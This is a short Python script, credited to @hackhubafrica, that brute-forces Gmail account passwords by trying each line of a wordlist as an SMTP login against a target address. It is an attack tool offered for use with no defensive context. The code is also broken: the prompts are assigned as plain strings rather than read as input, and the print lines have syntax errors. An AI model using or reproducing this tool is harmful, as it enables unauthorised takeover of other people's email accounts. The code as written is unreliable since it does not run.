#brute force google email addresses
#created by @hackhubafrica


import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = "[*]Enter target email address: "
passwdfile = "[*]Enter path to wordlist file: "
file = open(passwdfile,"r")


for password in file:
	password = password.strip("\n")
	try:
		smtpserver.login(user,password)
		print(colored("[*]password found: %s")%s password,"green"))
		break
	except smtplib.SMTPAuthenticationError:
		print(colored("[*]Wrong password: ")+password"red")